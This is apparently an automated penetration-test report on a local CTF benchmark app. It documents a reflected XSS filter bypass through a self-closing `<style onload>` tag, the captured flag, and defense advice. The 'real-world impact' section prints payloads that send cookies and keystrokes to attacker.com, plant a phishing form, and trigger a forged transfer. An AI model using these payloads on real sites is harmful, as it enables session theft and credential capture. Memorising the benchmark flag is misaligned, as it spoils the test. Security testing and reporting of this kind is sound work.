@@ -1,0 +1,186 @@
+# Security Assessment Report
+
+## Executive Summary
+
+- **Target:** http://localhost:33841
+- **Assessment Date:** October 27, 2025
+- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing
+
+## Summary by Vulnerability Type
+
+**Authentication Vulnerabilities:**
+No authentication vulnerabilities were found. The application has no authentication system implemented - all endpoints are publicly accessible by design.
+
+**Authorization Vulnerabilities:**
+No authorization vulnerabilities were found. The application has no authorization system implemented - all endpoints are publicly accessible by design.
+
+**Cross-Site Scripting (XSS) Vulnerabilities:**
+1 critical XSS vulnerability successfully exploited:
+- **XSS-VULN-01:** Reflected XSS via blacklist filter bypass in `/page` endpoint allowing arbitrary JavaScript execution through self-closing `<style>` tag with event handlers. Successfully retrieved CTF flag. In production environments, this would enable session hijacking, credential theft, keylogging, and unauthorized actions.
+
+**SQL/Command Injection Vulnerabilities:**
+No SQL or command injection vulnerabilities were found. The application has no database backend and implements safe subprocess execution patterns.
+
+**Server-Side Request Forgery (SSRF) Vulnerabilities:**
+No SSRF vulnerabilities were found.
+
+## Network Reconnaissance
+
+**Open Ports & Services (nmap scan):**
+- **Port 33841/tcp:** Target application - Dalgona Challenges running Werkzeug/1.0.1 with Python 2.7.18 (End-of-Life)
+- **Port 80/tcp:** Caddy httpd
+- **Port 443/tcp:** SSL/HTTPS (Caddy)
+- **Port 5003/tcp:** Werkzeug httpd 3.0.3 (Python 3.8.17) - MedGuard application
+- **Port 49158/tcp:** HTTP service (authentication required)
+
+**Technology Stack (whatweb scan):**
+- **Server:** Werkzeug/1.0.1 (outdated)
+- **Language:** Python 2.7.18 (End-of-Life since January 2020 - no security updates)
+- **Application:** Dalgona Challenges CTF platform
+
+**Subdomain Discovery (subfinder):**
+Multiple localhost subdomains discovered (mail.localhost, owa.regency.localhost, sbs.allsaintsschool.localhost, server2.hunter.localhost, www.localhost) - these are scan artifacts from the localhost environment and not part of the target application attack surface.
+
+**Security Observations:**
+- Python 2.7.18 is end-of-life and receives no security updates
+- Werkzeug 1.0.1 is outdated (current stable is 3.x)
+- Application runs in debug mode on development server (not production-grade)
+- PhantomJS validation engine is an abandoned project (last release 2016)
+
+---
+
+# Cross-Site Scripting (XSS) Exploitation Evidence
+
+## Successfully Exploited Vulnerabilities
+
+### XSS-VULN-01: Reflected XSS via Blacklist Filter Bypass in /page Endpoint
+
+**Summary:**
+- **Vulnerable location:** `http://localhost:33841/page?name=[PAYLOAD]`
+- **Overview:** Successfully bypassed blacklist regex filter using self-closing `<style>` tag with event handler to execute arbitrary JavaScript and retrieve the CTF flag
+- **Impact:** Arbitrary JavaScript execution leading to complete compromise of client-side security. In this CTF context, achieved flag disclosure. In a real-world scenario, this would enable session hijacking, credential theft, defacement, phishing, keylogging, and unauthorized actions on behalf of the victim.
+- **Severity:** Critical
+
+**Prerequisites:**
+- Web browser (any modern browser or curl)
+- Network access to http://localhost:33841
+
+**Technical Analysis:**
+
+The application implements a blacklist-based XSS filter using the regex pattern `r'<(?!style\b)[^>]+>'` with flags `re.IGNORECASE | re.DOTALL`. This pattern attempts to remove all HTML tags except those starting with `<style`.
+
+**Regex Breakdown:**
+- `<` - Match opening angle bracket
+- `(?!style\b)` - Negative lookahead: NOT followed by "style" word boundary
+- `[^>]+` - One or more characters that are not `>`
+- `>` - Closing angle bracket
+
+**Critical Weakness:** The regex only matches complete tags with content between `<` and `>`. A self-closing tag syntax like `<style/onload=alert('XSS')>` bypasses the filter because:
+1. The tag starts with `<style` (matches the negative lookahead exception)
+2. The `/onload=alert('XSS')` is treated as attributes of the `<style>` tag
+3. The regex doesn't filter it because it's a `<style` tag variant
+
+**Exploitation Steps:**
+
+1. **Access the vulnerable endpoint with the exploit payload:**
+```bash
+curl "http://localhost:33841/page?name=%3Cstyle/onload=alert('XSS')%3E"
+```
+
+Or visit in a browser:
+```
+http://localhost:33841/page?name=<style/onload=alert('XSS')>
+```
+
+2. **Observe JavaScript execution:**
+   - An alert dialog with message "XSS" appears in the browser
+   - PhantomJS backend detects the `alert('XSS')` call via its hooked `onAlert` handler
+
+3. **Retrieve the flag from the HTTP response:**
+   - The application recognizes successful XSS via PhantomJS detection
+   - The flag is included in the HTML response
+
+**Proof of Impact:**
+
+**Flag Successfully Exfiltrated:**
+```
+FLAG{f0e68b39faf21a895f14e832f1f7738292e0c85ef7373df8931ae61c0853fd21}
+```
+
+**Complete HTTP Response Excerpt:**
+```html
+<div class="solution-text">
+  <img src="static/img/cookies/success_star.png" alt="Correct" width="150" height="150">
+  <br>Congratulations!
+  <p> Here is the flag: FLAG{f0e68b39faf21a895f14e832f1f7738292e0c85ef7373df8931ae61c0853fd21}
+</div>
+<input type=text name=name placeholder="Enter your name...">
+<style/onload=alert('XSS')>
+```
+
+**Evidence Screenshots:**
+- `xss_style_test.png` - Visual confirmation of CSS injection (red background) proving payload reaches browser
+- `xss_exploit_success.png` - Successful exploitation showing "Congratulations!" message with flag disclosure
+
+**Real-World Impact Demonstration:**
+
+While this CTF application has no authentication or session management, in a real-world scenario this vulnerability would enable:
+
+**1. Session Hijacking:**
+```html
+<style/onload=fetch('https://attacker.com/steal?cookie='+document.cookie)>
+```
+
+**2. Credential Theft via Phishing:**
+```html
+<style/onload=document.body.innerHTML='<form action=https://attacker.com/phish><input name=password placeholder=Password><button>Login</button></form>'>
+```
+
+**3. Keylogger Installation:**
+```html
+<style/onload=document.onkeypress=function(e){fetch('https://attacker.com/log?key='+e.key)}>
+```
+
+**4. Defacement:**
+```html
+<style/onload=document.body.innerHTML='<h1>Hacked!</h1>'>
+```
+
+**5. Unauthorized Actions (CSRF via XSS):**
+```html
+<style/onload=fetch('/api/transfer',{method:'POST',body:JSON.stringify({to:'attacker',amount:1000})})>
+```
+
+**Notes:**
+
+**Why This Bypass Works:**
+The blacklist filter's fatal flaw is attempting to enumerate "bad" patterns rather than using context-appropriate output encoding. The HTML specification allows flexible tag syntax including:
+- Self-closing tags with attributes: `<tag/attribute=value>`
+- Event handlers on any HTML element: `onload`, `onerror`, `onfocus`, etc.
+
+The `<style>` tag, while not traditionally associated with event handlers, still supports them as it's a valid HTML element. Modern browsers execute these event handlers when the element is loaded into the DOM.
+
+**Defense Recommendations:**
+1. **Use context-appropriate output encoding** - Apply HTML entity encoding before inserting user data into HTML context
+2. **Implement Content Security Policy (CSP)** - Add strict CSP headers to prevent inline script execution
+3. **Replace blacklist with whitelist** - If filtering is necessary, only allow explicitly safe patterns
+4. **Use a modern framework** - Modern frameworks like React, Vue, or Angular provide automatic XSS protection through auto-escaping
+5. **Never trust client-side filtering** - Always sanitize on the server side
+
+**Timeline:**
+- Initial reconnaissance: Confirmed `<style>` tag injection bypasses filter
+- Payload development: Tested various bypass techniques including self-closing tag syntax
+- Successful exploitation: Achieved JavaScript execution with `<style/onload=alert('XSS')>`
+- Flag retrieval: Obtained CTF flag through PhantomJS detection mechanism
+- Impact demonstration: Documented real-world attack scenarios
+
+**Affected Components:**
+- File: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py`
+- Function: `page_handler()` (lines 63-72)
+- Vulnerable code: Line 67 (blacklist regex filter)
+- Sink: Line 72 (TEMPLATE_CONTENT_TAG.format with unencoded user input)
+
+**CVE/CWE Classification:**
+- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
+- CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
+- CWE-184: Incomplete List of Disallowed Inputs (Blacklist bypass)
